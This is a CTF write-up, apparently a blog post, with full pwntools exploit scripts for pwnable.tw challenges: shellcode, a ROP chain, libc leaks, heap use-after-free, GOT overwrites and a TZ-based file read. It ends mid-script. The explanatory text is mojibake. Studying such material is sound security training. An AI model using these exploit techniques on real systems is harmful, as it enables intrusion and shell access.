---
title: pwnable.tw 1~10é¢˜ writeup
tags:
  - pwnable.tw
date: 2018/2/21
---

ç½‘å€ï¼š[https://pwnable.tw](http://pwnable.tw)

å…ˆæ”¾å‰åé¢˜çš„wp,åé¢çš„è¿˜æ²¡åšğŸ¥ğŸ¥ğŸ¥


## start 100pts

ç®€å•çš„æ ˆæº¢å‡ºï¼Œå…ˆleakæ ˆåœ°å€ï¼Œç„¶åè·³åˆ°æ ˆä¸Šçš„shellcodeå»get shellã€‚

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./start')
	bin = ELF('./start')
else:
	cn = remote('chall.pwnable.tw', 10000)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

cn.recv()
pay = 'a'*20+p32(0x08048087)
cn.send(pay)

data = u32(cn.recv()[:4])
stack = data+0x10
success('stack: '+hex(stack))

pay = 'a'*20+p32(stack+4)+"\x31\xc0\x50\x68\x2f\x2f\x73"\
                   "\x68\x68\x2f\x62\x69\x6e\x89"\
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"\
                   "\xcd\x80\x31\xc0\x40\xcd\x80"
cn.send(pay)

cn.interactive()
```



## orw 100pts

å†™shellcodeï¼Œåˆ©ç”¨open,read,writeæ¥get shell.

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./orw')
	bin = ELF('./orw')
else:
	cn = remote('chall.pwnable.tw', 10001)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recv()

shellcode='''
push {};
sub dword ptr [esp],0x01010101;
push {};
push {};
push {};
mov ebx,esp;
xor ecx,ecx;
xor edx,edx;
xor eax,eax;
mov al,0x5;
int 0x80;
mov ebx,eax;
xor eax,eax;
mov al,0x3;
mov ecx,esp;
mov dl,0x30;
int 0x80;
mov al,0x4;
mov bl,1;
mov dl,0x30;
int 0x80;
'''.format(hex(u32('bh'+chr(1)+chr(1))),hex(u32('w/fl')),hex(u32('e/or')),hex(u32('/hom')))
#z('b*0x0804858A\nc')
cn.sendline(asm(shellcode))



cn.interactive()
```



## calc 150pts

æœ‰ä¸€ä¸ªé€»è¾‘æ¼æ´

```python
pool *__cdecl eval(pool *pool, char op)
{
  pool *result; // eax

  if ( op == '+' )
  {
    pool->data[pool->idx - 2] += pool->data[pool->idx - 1];
  }
  else if ( op > '+' )
  {
    if ( op == '-' )
    {
      pool->data[pool->idx - 2] -= pool->data[pool->idx - 1];
    }
    else if ( op == '/' )
    {
      pool->data[pool->idx - 2] /= pool->data[pool->idx - 1];
    }
  }
  else if ( op == '*' )
  {
    pool->data[pool->idx - 2] *= pool->data[pool->idx - 1];
  }
  result = pool;
  --pool->idx;
  return result;
}
```

æ„é€ ä¾‹å¦‚`+123+1`èƒ½å‘idxå†™å€¼ï¼Œè¿›è€Œå‘ä»»æ„ä¸‹æ ‡å¤„å†™ä»»æ„å€¼ã€‚


ç½‘ä¸Šåˆ†æå¾ˆå¤šï¼Œå°±ä¸è¯´äº†ã€‚

exp

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./calc')
	bin = ELF('./calc')
else:
	cn = remote('chall.pwnable.tw', 10100)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


from struct import pack

# Padding goes here
p = ''
p+=p32(0x804967a)
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80
for i in range(len(p)/4-1):
    cn.sendline('+'+str(369+i)+'-'+str(u32(p[i*4:i*4+4]))+'+'+str(u32(p[i*4+4:i*4+8])))

cn.sendline('')

cn.interactive()
```



## dubblesort 200pts

ä»£ç å¾ˆå°‘,ä¸»è¦å°±æ˜¯å†™äº†ä¸€ä¸ªå†’æ³¡æ’åº.

ä¿æŠ¤å¾ˆå¥½,
```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

é¦–å…ˆæ˜¯leak.

```cpp
  __printf_chk(1, "What your name :");
  read(0, name, 0x40u);                         // æ²¡æœ‰æˆªæ–­
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");// leak
```

readå¤„æ²¡æœ‰0æˆªæ–­,å¯¼è‡´å¯ä»¥leak,è·å¾—stackä¸Šæ®‹ç•™çš„libcåœ°å€,ä»è€Œå¾—åˆ°libcåŸºåœ°å€,é€šè¿‡ropè°ƒç”¨system("/bin/sh")


ç„¶åæ˜¯è¾“å…¥numçš„æ—¶å€™æ²¡æœ‰åšé™åˆ¶,ä»è€Œé€ æˆæ ˆæº¢å‡º.å¦‚æœæ²¡æœ‰canaryå°±å¥½äº†,å¯æƒœæ˜¯æœ‰çš„.

```cpp
  __isoc99_scanf((int)"%u", (int)&n);
  v3 = n;
  if ( n )                                      // æ²¡æœ‰é™åˆ¶numçš„æ•°é‡,æ ˆæº¢å‡º
  {
    idx = array;
    i = 0;
    do
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf((int)"%u", (int)idx);      // æ²¡æœ‰æ£€æŸ¥è¿”å›å€¼
      ++i;
      v3 = n;
      ++idx;
    }
    while ( n > i );
  }
  sort((unsigned int *)array, v3);
```

canaryæ²¡æœ‰æ–¹æ³•é¢„å…ˆçŸ¥é“,æ‰€ä»¥å”¯ä¸€ç»•è¿‡çš„æ–¹æ³•å°±æ˜¯è®©sortåçš„canaryå€¼å‘†åœ¨åŸåœ°.

è€Œä¸”scanfæ²¡æœ‰æ£€æŸ¥è¿”å›å€¼,æ‰€ä»¥æˆ‘ä»¬é€šè¿‡è¾“å…¥éæ•°å­—æ¥è®©ç»•è¿‡è¦†ç›–,ä¸å¿…æ’åºnä¸ªå˜é‡å°±è¦è¾“å…¥nä¸ªå˜é‡.

é€šè¿‡gdbè§‚å¯Ÿ,æˆ‘å‡‘äº†ä¸€ç»„å¯èƒ½çš„è§£.(canaryçš„å€¼éšæœº,æ‰€ä»¥ä¸æ˜¯100%æˆåŠŸ

exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./dubblesort')
	bin = ELF('./dubblesort')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10101)
	bin = ELF('./dubblesort')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recvuntil('name :')
name = '\x01'*25
cn.send(name)
cn.recvuntil(name)
if local:
	libc.address = u32('\x00'+cn.recv(3))-0x1b2000
else:
	libc.address = u32('\x00'+cn.recv(3))-0x1b0000
success('libc_base: '+hex(libc.address))

system = libc.symbols['system']
binsh = libc.search('/bin/sh\x00').next()
success(hex(system))
success(hex(binsh))

cn.recvuntil('sort :')
n = 47
cn.sendline(str(n))

for i in range(12):
	cn.recv()
	cn.sendline(str(0))

for i in range(7):
	cn.sendline(str(system))
cn.sendline(str(binsh))

#z()

cn.sendline('a')#bypass scanf continue read num

cn.interactive()
```



## hacknote 200pts

è¿™é¢˜æ¯”è¾ƒåŸºç¡€,freeå®Œæ²¡æœ‰æ¸…é™¤æŒ‡é’ˆ.å…¸å‹çš„å †é¢˜

é¦–å…ˆæ„é€ å †å—,æˆ‘æ˜¯leak unsorted binçš„bkæŒ‡é’ˆä»è€Œå¾—åˆ°libc base.

ç„¶åæ˜¯å†™heapä¸Šçš„å‡½æ•°æŒ‡é’ˆ,å¾—shell.

exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./hacknote')
	bin = ELF('./hacknote')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10102)
	bin = ELF('./hacknote')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def add(size,con):
	cn.sendline('1')
	cn.recvuntil('Note size :')
	cn.sendline(str(size))
	cn.recvuntil('Content :')
	cn.send(con)

def dele(idx):
	cn.sendline('2')
	cn.recvuntil("Index :")
	cn.sendline(str(idx))

def show(idx):
	cn.sendline('3')
	cn.recvuntil("Index :")
	cn.sendline(str(idx))


add(0x80,'a')#0
add(0x80,'a')#1
dele(0)

add(0x80,'X')#2
show(2)

cn.recvuntil('X')

cn.recv(3)
if local:
	libc.address = u32(cn.recv(4))-48-0x1b2780
else:
	libc.address = u32(cn.recv(4))-48-0x001B0780
success('libc_base: '+hex(libc.address))
system = libc.sym['system']
dele(0)
dele(1)

pay = p32(system)+';/bin/sh\x00'
add(0x90,pay)
#z('b*0x08048923\nc')

show(0)

cn.interactive()
```



## Silver Bullet 200pts

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

çœ‹ä¿æŠ¤,å¤§æ¦‚æ˜¯æ ˆæº¢å‡ºäº†

å…¨ç¨‹åªæœ‰ä¸€ä¸ªæ´,åœ¨strncatä¸Š,strncatä¼šå‘catåçš„strçš„æœ€åæ·»åŠ ä¸€ä¸ª'\x00'å­—èŠ‚,ä»è€Œè¦†ç›–äº†len.

structå¤§è‡´å¦‚ä¸‹:
```
{
    char bullet_buf[0x30];
    int len;
}
```

å‡è®¾æˆ‘ä»¬å…ˆå†™äº†47ä¸ªå­—èŠ‚,ç„¶ååœ¨powerupçš„æ—¶å€™å†™äº†1ä¸ªå­—èŠ‚,è¿™æ—¶å€™bufçš„0x30å­—èŠ‚éƒ½è¢«å¡«æ»¡äº†,æœ«å°¾çš„\0å°±ä¼šè¦†ç›–len,æ–°lenå°±ä¼šå˜æˆ1,å†æ¬¡powerupçš„æ—¶å€™,ç”±äºlenå’Œcharé—´æ²¡æœ‰\0,strncatä¼šè¿æ¥åˆ°lençš„åé¢,ä»è€Œæ”¹å†™lenå¹¶rop.
```cpp
      printf("Give me your another description of bullet :");
      read_input(buf, 48 - bullet[12]);
      strncat((char *)bullet, buf, 48 - bullet[12]);// å°¾éƒ¨æ·»\0,è¦†ç›–len
      v2 = strlen(buf) + bullet[12];            // bullet[12]=0
      printf("Your new power is : %u\n", v2);
      bullet[12] = v2;
      puts("Enjoy it !");
```

exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./silver_bullet')
	bin = ELF('./silver_bullet')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10103)
	bin = ELF('./silver_bullet')
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def create(con):
	cn.sendline('1')
	cn.recvuntil('of bullet :')
	cn.send(con)

def powerup(con):
	cn.sendline('2')
	cn.recvuntil('of bullet :')
	cn.send(con)

def beat():
	cn.sendline('3')


p1ret=0x08048475

create('a'*(0x30-1))

powerup('b')#power 1
#z('b*0x080488FB\nc')
pay = '\xff'*3 + 'bbbb'
pay+=p32(bin.plt['puts'])+p32(p1ret)+p32(bin.got['puts'])
pay+=p32(bin.sym['main'])
powerup(pay)

beat()

cn.recvuntil('win !!\n')

libc.address = u32(cn.recv(4))-libc.sym['puts']
success('libc_base: '+hex(libc.address))
system = libc.sym['system']
binsh = libc.search('/bin/sh\x00').next()

#============one more time
create('a'*(0x30-1))

powerup('b')
pay = '\xff'*3 + 'bbbb'
pay+=p32(system)+p32(p1ret)+p32(binsh)
powerup(pay)

beat()

cn.interactive()

```



## applestore 200pts

è¿™é¢˜ç€å®æœ‰è®©æˆ‘å­¦åˆ°æ–°çš„çŸ¥è¯†,å¾ˆèµ!

é¦–å…ˆæ˜¯æ´.

çœ‹checkoutå‡½æ•°
```cpp
unsigned int checkout()
{
  int total; // [esp+10h] [ebp-28h]
  chunk p; // [esp+18h] [ebp-20h]
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  total = cart();
  if ( total == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf((char **)&p, "%s", "iPhone 8");
    p.price = 1;
    insert(&p);
    total = 0x1C07;
  }
  printf("Total: $%d\n", total);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v3;
}
```

ä½†ä½ ä¹°åˆ°æŒ‡å®šä»·æ ¼æ—¶,ä»–ä¼šé€ä½ ä¸€éƒ¨iphone8,ä½†æ˜¯,å…¶ä»–çš„ä¹‹å‰çš„å•†å“éƒ½æ˜¯é€šè¿‡mallocåˆ›å»ºchunkçš„,è€Œè¿™ä¸ªæ˜¯åˆ†é…åœ¨æ ˆä¸Šçš„,è€Œä¸”æ˜¯ä¸´æ—¶å˜é‡,ä¹Ÿå°±æ˜¯è¯´,å‡ºäº†è¿™ä¸ªå‡½æ•°,åœ¨ä»handlerè¿›å…¶ä»–å­å‡½æ•°æ—¶,è¿™å—å†…å­˜å°±è¢«å…¶ä»–æ•°æ®è¦†ç›–äº†,çœ‹äº†ä¸€ä¸‹,æ­£å¥½åœ¨æˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥çš„bufå†….

å› æ­¤æˆ‘ä»¬æœ‰äº†æ”¹å†™iphone8ç»“æ„ä½“çš„èƒ½åŠ›,é¦–å…ˆæ˜¯name,è¦†ç›–åèƒ½åšä»»æ„åœ°å€è¯».è·å–libcåœ°å€çš„è¯å¡«GOTå°±è¡Œ.å…³é”®æ˜¯æ€ä¹ˆgetshell.

è§‚å¯Ÿåˆ°deleteå‡½æ•°,

```cpp
int __cdecl delete()
{
  signed int i; // [esp+10h] [ebp-38h]
  chunk *p; // [esp+14h] [ebp-34h]
  int n; // [esp+18h] [ebp-30h]
  chunk *FD; // [esp+1Ch] [ebp-2Ch]
  chunk *BK; // [esp+20h] [ebp-28h]
  char buf[22]; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  i = 1;
  p = myCart.fd;
  printf("Item Number> ");
  fflush(stdout);
  my_read(buf, 0x15u);
  n = atoi(buf);
  while ( p )
  {
    if ( i == n )
    {
      FD = p->fd;
      BK = p->bk;
      if ( BK )
        BK->fd = FD;
      if ( FD )
        FD->bk = BK;
      printf("Remove %d:%s from your shopping cart.\n", i, p->name);
      return __readgsdword(0x14u) ^ v7;
    }
    ++i;
    p = p->fd;
  }
  return __readgsdword(0x14u) ^ v7;
}
```

æœ‰ä¸ªunlinkçš„è¿‡ç¨‹,ä½†FDå’ŒBKå¿…é¡»æ˜¯ä¸¤ä¸ªå¯å†™çš„åœ°å€æ‰è¡Œ.

æƒ³äº†å¾ˆä¹…å¾ˆä¹…å¾ˆä¹…........................................
è¿˜æ˜¯çœ‹äº†åˆ«äººçš„wp,æç„¶å¤§æ‚Ÿ

äº¤æ¢GOTå’Œebp,ä»è€Œå­å‡½æ•°retåå›åˆ°main,ebpä¼šåˆ°GOTä¸Š,åœ¨mainä¸­read,ä¼šè¯»åˆ°GOTè¡¨ä¸Š,å¯ä»¥æ”¹å†™atoiåˆ°system.

è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯å¦‚ä½•è·å–stackçš„åœ°å€.
æœ‰ä¸¤ç§æ–¹æ³•:
1.åˆ©ç”¨å‰é¢çš„leakæ´,ä»ç¬¬ä¸€ä¸ªchunkå¼€å§‹,ä¸æ–­leak chunkçš„fd,ç›´åˆ°stackä¸Šçš„chunkçš„å‰ä¸€ä¸ªçš„chunkçš„fd,å³å¯å¾—åˆ°stack
2.åˆ©ç”¨libcä¸Šçš„å˜é‡environ,å†™çš„æ˜¯åœ¨æ ˆä¸Šçš„ç¯å¢ƒå˜é‡çš„åœ°å€,leakå³å¯

exp:

```
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./applestore')
	bin = ELF('./applestore')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10104)
	bin = ELF('./applestore')
	libc = ELF('./libc_32.so.6')



def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def buy(idx):
	cn.sendline('2')
	cn.recvuntil('Device Number> ')
	cn.sendline(str(idx))

def dele(idx):
	cn.sendline('3')
	cn.recvuntil('Item Number> ')
	cn.sendline(str(idx))

def dele2(con):
	cn.sendline('3')
	cn.recvuntil('Item Number> ')
	cn.sendline(con)

def show(con):
	cn.sendline('4')
	cn.recvuntil('(y/n) > ')
	cn.sendline(con)

def checkout():
	cn.sendline('5')
	cn.recvuntil('(y/n) > ')
	cn.sendline('y')

for i in range(20):
	buy(2)
for i in range(6):
	buy(1)

#z('b*0x08048B83\nb*0x08048ABE\nc')

checkout()
pay = 'y\x00'
pay+=p32(bin.got['puts'])+p32(1)+p32(0)+p32(0)
show(pay)

cn.recvuntil('27: ')
libc.address = u32(cn.recv(4))-libc.sym['puts']
envp = libc.sym['environ']
system = libc.sym['system']
success('libc_base: '+hex(libc.address))
#success('envp: '+hex(envp))

pay = 'y\x00'
pay+=p32(envp)+p32(1)+p32(0)+p32(0)
show(pay)

cn.recvuntil('27: ')
stack_envp = u32(cn.recv(4))
success('stack_envp: '+hex(stack_envp))

ebp = stack_envp-0x104
atoi_got = bin.got['atoi']
#z('b*0x08048A6F\nb*0x8048c0b\nc')
pay = '27'
pay+=p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)
dele2(pay)


pay = '$0\x00\x00'+p32(system)
cn.sendline(pay)

cn.interactive()
'''
1: iPhone 6 - $199
2: iPhone 6 Plus - $299
3: iPad Air 2 - $499
4: iPad Mini 3 - $399
5: iPod Touch - $199

7174 = 20*299+6*199

00000000 chunk           struc ; (sizeof=0x10, mappedto_5)
00000000                                         ; XREF: .bss:myCart/r
00000000                                         ; checkout/r
00000000 name            dd ?
00000004 price           dd ?                    ; XREF: checkout+50/w
00000008 fd              dd ?                    ; XREF: cart+61/r ; offset
0000000C bk              dd ?                    ; offset
00000010 chunk           ends
'''
```




## criticalheap 200pts

è¿™é¢˜å¾ˆæœ‰éš¾åº¦,å› ä¸ºåˆ©ç”¨çš„ç‚¹ä»æ¥æ²¡è§è¿‡.

ä¿æŠ¤:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

ä¸‰ä¸ªç»“æ„ä½“:

```
00000000 chunk_normal    struc ; (sizeof=0x48, mappedto_6)
00000000 name            dq ?                    ; offset
00000008 inuse           dq ?
00000010 type            dq ?
00000018 content         db 40 dup(?)
00000040 sig             dq ?
00000048 chunk           ends
00000048
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 chunk_time      struc ; (sizeof=0x48, mappedto_8)
00000000 name            dq ?                    ; offset
00000008 inuse           dq ?
00000010 type            dq ?
00000018 tm              dq ?                    ; offset
00000020 year            dd ?
00000024 mon             dd ?
00000028 day             dd ?
0000002C hour            dd ?
00000030 min             dd ?
00000034 sec             dd ?
00000038 field_38        dd ?
0000003C field_3C        dd ?
00000040 field_40        dq ?
00000048 chunk_time      ends
00000048
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 chunk_system    struc ; (sizeof=0x48, mappedto_9)
00000000 name            dq ?                    ; offset
00000008 inuse           dq ?
00000010 type            dq ?
00000018 dir_name        dq ?                    ; offset
00000020 detail          dq ?
00000028 usr             dq ?
00000030 _name           dq ?
00000038 rand_num        dd ?
0000003C field_3C        dd ?
00000040 field_40        dq ?
00000048 chunk_system    ends
```
å…ˆè¯´è¯´æ‰¾åˆ°çš„æ´å§.(è™½ç„¶æ²¡æœ‰å…¨ç”¨åˆ°)

1. ç¨‹åºå¼€å§‹æ—¶ç”¨srand(time(0))åˆå§‹åŒ–äº†ç§å­,ä½†æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»º`clock_heap`,å¦‚æœå¤Ÿå¿«çš„è¯åº”è¯¥å°±èƒ½è·å–åˆ°æ—¶é—´,ç„¶å`system_heap`ä¸‹çš„randéšæœºæ•°å°±å¯ä»¥é¢„æµ‹äº†.(æ²¡æµ‹è¯•è¿‡)
2. åœ¨`normal_heap`çš„playä¸‹,æœ‰ä¸€ä¸ª`printf_chk`çš„fmtæ´,é…åˆ`normal_heap`çš„playä¸‹çš„change contentå°±èƒ½åœ¨æ ˆä¸Šç•™ä¸‹ä¿¡æ¯,ç„¶åä»»æ„åœ°å€è¯»(å› ä¸ºæœ‰chk,æ‰€ä»¥åº”è¯¥æ˜¯æ— æ³•ç”¨%næ¥ä»»æ„åœ°å€å†™çš„)
3. `chunk_system`çš„`detail`åœ¨offset 0x20,`chunk_normal`çš„`content`åœ¨offset 0x18çš„ä½ç½®,`content`è¯»å–çš„æ—¶å€™æ²¡æœ‰æˆªæ–­,è€Œdetailæ˜¯å­˜åœ¨æ ˆä¸Šçš„,å› æ­¤å¯ä»¥leak heap.
4. (é‡ç‚¹)`localtime`å’Œ`setenv`é…åˆå°±èƒ½å°†ä»»æ„æ–‡ä»¶å†…å®¹å†™åˆ°heapä¸Š.

ä¸‹é¢ä¸»è¦ä»‹ç»ç¬¬å››ç‚¹:
ä»¥libc2.23çš„æºç ä¸ºä¾‹.

```cpp
/* Return the `struct tm' representation of *T in local time.  */
struct tm *
localtime (const time_t *t)
{
  return __tz_convert (t, 1, &_tmbuf);
}
libc_hidden_def (localtime)
```

```cpp
/* Return the `struct tm' representation of *TIMER in the local timezone.
   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */
struct tm *
__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)
{
  long int leap_correction;
  int leap_extra_secs;

  if (timer == NULL)
    {
      __set_errno (EINVAL);
      return NULL;
    }

  __libc_lock_lock (tzset_lock);

  /* Update internal database according to current TZ setting.
     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.
     This is a good idea since this allows at least a bit more parallelism.  */
  tzset_internal (tp == &_tmbuf && use_localtime, 1);

  if (__use_tzfile)
    __tzfile_compute (*timer, use_localtime, &leap_correction,
		      &leap_extra_secs, tp);
		      
  <--æ— å…³ä»£ç çœç•¥-->
  
  return tp;
}
```

```cpp
/* Interpret the TZ envariable.  */
static void
internal_function
tzset_internal (int always, int explicit)
{
  static int is_initialized;
  const char *tz;

  if (is_initialized && !always)
    return;
  is_initialized = 1;

  /* Examine the TZ environment variable.  */
  tz = getenv ("TZ");//â˜…æ³¨æ„æ­¤å¤„,ä»envä¸­è¯»å–TZçš„å€¼
  if (tz == NULL && !explicit)
    /* Use the site-wide default.  This is a file name which means we
       would not see changes to the file if we compare only the file
       name for change.  We want to notice file changes if tzset() has
       been called explicitly.  Leave TZ as NULL in this case.  */
    tz = TZDEFAULT;
  if (tz && *tz == '\0')
    /* User specified the empty string; use UTC explicitly.  */
    tz = "Universal";

  /* A leading colon means "implementation defined syntax".
     We ignore the colon and always use the same algorithm:
     try a data file, and if none exists parse the 1003.1 syntax.  */
  if (tz && *tz == ':')
    ++tz;

  /* Check whether the value changed since the last run.  */
  if (old_tz != NULL && tz != NULL && strcmp (tz, old_tz) == 0)
    /* No change, simply return.  */
    return;

  if (tz == NULL)
    /* No user specification; use the site-wide default.  */
    tz = TZDEFAULT;

  tz_rules[0].name = NULL;
  tz_rules[1].name = NULL;

  /* Save the value of `tz'.  */
  free (old_tz);
  old_tz = tz ? __strdup (tz) : NULL;

  /* Try to read a data file.  */
  __tzfile_read (tz, 0, NULL);//â˜…å¸¦ç€TZè¿›å…¥__tzfile_readå‡½æ•°
  if (__use_tzfile)
    return;

<--æ— å…³ä»£ç çœç•¥-->

}
```

```cpp
void
__tzfile_read (const char *file, size_t extra, char **extrap)
{
  static const char default_tzdir[] = TZDIR;
  size_t num_isstd, num_isgmt;
  FILE *f;
  struct tzhead tzhead;
  size_t chars;
  size_t i;
  size_t total_size;
  size_t types_idx;
  size_t leaps_idx;
  int was_using_tzfile = __use_tzfile;
  int trans_width = 4;
  size_t tzspec_len;
  char *new = NULL;

  if (sizeof (time_t) != 4 && sizeof (time_t) != 8)
    abort ();

  __use_tzfile = 0;

  if (file == NULL)
    /* No user specification; use the site-wide default.  */
    file = TZDEFAULT;
  else if (*file == '\0')
    /* User specified the empty string; use UTC with no leap seconds.  */
    goto ret_free_transitions;
  else
    {
      /* We must not allow to read an arbitrary file in a setuid
	 program.  So we fail for any file which is not in the
	 directory hierachy starting at TZDIR
	 and which is not the system wide default TZDEFAULT.  */
      if (__libc_enable_secure
	  && ((*file == '/'
	       && memcmp (file, TZDEFAULT, sizeof TZDEFAULT)
	       && memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))
	      || strstr (file, "../") != NULL))
	/* This test is certainly a bit too restrictive but it should
	   catch all critical cases.  */
	goto ret_free_transitions;
    }

  if (*file != '/')
    {
      const char *tzdir;

      tzdir = getenv ("TZDIR");//â˜…ä»ç¯å¢ƒå˜é‡TZDIRä¸­è¯»å–ç›®å½•
      if (tzdir == NULL || *tzdir == '\0')
	tzdir = default_tzdir;
      if (__asprintf (&new, "%s/%s", tzdir, file) == -1)
	goto ret_free_transitions;
      file = new;
    }

  /* If we were already using tzfile, check whether the file changed.  */
  struct stat64 st;
  if (was_using_tzfile
      && stat64 (file, &st) == 0
      && tzfile_ino == st.st_ino && tzfile_dev == st.st_dev
      && tzfile_mtime == st.st_mtime)
    goto done;  /* Nothing to do.  */

  /* Note the file is opened with cancellation in the I/O functions
     disabled and if available FD_CLOEXEC set.  */
  f = fopen (file, "rce");//â˜…æ‰“å¼€æ–‡ä»¶
  
  <--ä¸å†è¿½ç©¶å…·ä½“ç»†èŠ‚-->
```

åé¢çš„ç»†èŠ‚æˆ‘ä»¬å°±ä¸ç®¡äº†,åæ­£æœ€åé€šè¿‡mallocçš„å½¢å¼è¯»å–æ–‡ä»¶å†…å®¹åˆ°heapä¸Š.


å› æ­¤æˆ‘ä»¬åªè¦æ§åˆ¶TZå’ŒTZDIRå°±èƒ½å°†flagçš„å†…å®¹è¯»åˆ°heapä¸Š.
å†é€šè¿‡leak heapå’Œfmt ä»»æ„åœ°å€è¯»æ¥æ‰“å°flagå³å¯.

exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./critical_heap')
	bin = ELF('./critical_heap')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10500)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def create_normal_heap(name,content):
	cn.sendline('1')
	cn.recvuntil('Name of heap:')
	cn.send(name)
	cn.recvuntil('Your choice : ')
	cn.sendline('1')
	cn.recvuntil('Content of heap :')
	cn.send(content)

def create_clock_heap(name):
	cn.sendline('1')
	cn.recvuntil('Name of heap:')
	cn.send(name)
	cn.recvuntil('Your choice : ')
	cn.sendline('2')

def create_system_heap(name):
	cn.sendline('1')
	cn.recvuntil('Name of heap:')
	cn.send(name)
	cn.recvuntil('Your choice : ')
	cn.sendline('3')

def show(idx):
	cn.sendline('2')
	cn.recvuntil('Index of heap :')
	cn.sendline(str(idx))

def dele(idx):
	cn.sendline('5')
	cn.recvuntil('Index of heap :')
	cn.sendline(str(idx))



create_system_heap('aaaa')#0

#play->set name
cn.sendline('4')
cn.recvuntil('Index of heap :')
cn.sendline('0')#idx
cn.recvuntil('Your choice : ')
cn.sendline('1')
cn.recvuntil('Give me a name for the system heap :')
cn.sendline('aaaa')
cn.recvuntil('Give me a value for this name :')
cn.sendline('aaaa')
#play->get value
cn.recvuntil('Your choice : ')
cn.sendline('4')
cn.recvuntil("What's name do you want to see :")
